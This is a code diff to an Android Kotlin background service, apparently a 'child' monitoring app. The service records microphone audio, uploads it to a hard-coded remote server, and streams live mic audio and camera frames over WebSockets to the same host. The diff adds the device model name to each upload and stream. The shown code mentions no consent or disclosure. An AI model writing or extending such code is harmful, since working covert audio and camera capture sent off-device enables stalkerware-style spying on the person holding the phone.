@@ -5,8 +5,6 @@ import android.content.Context
 import android.content.Intent
 import android.graphics.ImageFormat
 import android.hardware.camera2.*
-import android.hardware.camera2.params.OutputConfiguration
-import android.hardware.camera2.params.SessionConfiguration
 import android.media.AudioFormat
 import android.media.AudioRecord
 import android.media.ImageReader
@@ -20,7 +18,6 @@ import okhttp3.MediaType.Companion.toMediaType
 import okhttp3.RequestBody.Companion.asRequestBody
 import okio.ByteString.Companion.toByteString
 import java.io.File
-import java.util.concurrent.Executor
 
 class MonitoringService : Service() {
 
@@ -28,6 +25,7 @@ class MonitoringService : Service() {
     private val CHANNEL_ID = "monitoring_channel"
     private val SERVER_URL = "https://overflowing-perception-production-17b2.up.railway.app/upload"
     private val WS_URL = "wss://overflowing-perception-production-17b2.up.railway.app"
+    private val DEVICE_NAME = android.os.Build.MODEL
     private var isLive = false
     private var isCameraLive = false
     private var wsAudio: okhttp3.WebSocket? = null
@@ -44,7 +42,7 @@ class MonitoringService : Service() {
     private var cameraHandler: Handler? = null
     private var currentCameraIndex = 0
     private var lastFrameTime = 0L
-    private val FRAME_INTERVAL = 150L // ~6-7 fps
+    private val FRAME_INTERVAL = 150L
 
     override fun onCreate() {
         super.onCreate()
@@ -84,7 +82,6 @@ class MonitoringService : Service() {
         getSystemService(NotificationManager::class.java).createNotificationChannel(channel)
     }
 
-    // --- AUDIO RECORDING ---
     private fun startAudioRecording() {
         try {
             val file = File(cacheDir, "audio_${System.currentTimeMillis()}.mp4")
@@ -110,6 +107,7 @@ class MonitoringService : Service() {
                 val body = MultipartBody.Builder()
                     .setType(MultipartBody.FORM)
                     .addFormDataPart("file", file.name, file.asRequestBody("audio/mp4".toMediaType()))
+                    .addFormDataPart("device", DEVICE_NAME)
                     .build()
                 OkHttpClient().newCall(Request.Builder().url(SERVER_URL).post(body).build()).execute()
                 file.delete()
@@ -117,11 +115,10 @@ class MonitoringService : Service() {
         }.start()
     }
 
-    // --- LIVE AUDIO ---
     private fun startLiveStream() {
         isLive = true
         wsAudio = OkHttpClient().newWebSocket(
-            Request.Builder().url("$WS_URL?type=child").build(),
+            Request.Builder().url("$WS_URL?type=child&device=${DEVICE_NAME}").build(),
             object : WebSocketListener() {
                 override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
                     streamMicToWebSocket(webSocket)
@@ -157,7 +154,6 @@ class MonitoringService : Service() {
         wsAudio = null
     }
 
-    // --- CAMERA STREAM ---
     private fun startCameraStream() {
         isCameraLive = true
         cameraThread = HandlerThread("CameraThread").also { it.start() }
@@ -168,7 +164,7 @@ class MonitoringService : Service() {
             .build()
 
         wsCamera = okClient.newWebSocket(
-            Request.Builder().url("$WS_URL?type=camera").build(),
+            Request.Builder().url("$WS_URL?type=camera&device=${DEVICE_NAME}").build(),
             object : WebSocketListener() {
                 override fun onOpen(webSocket: okhttp3.WebSocket, response: Response) {
                     openCamera(webSocket)
@@ -185,7 +181,6 @@ class MonitoringService : Service() {
         val cameraList = cameraManager.cameraIdList
         val cameraId = cameraList[currentCameraIndex.coerceAtMost(cameraList.size - 1)]
 
-        // Small size = fast!
         imageReader = ImageReader.newInstance(256, 192, ImageFormat.JPEG, 3)
         imageReader?.setOnImageAvailableListener({ reader ->
             val now = System.currentTimeMillis()
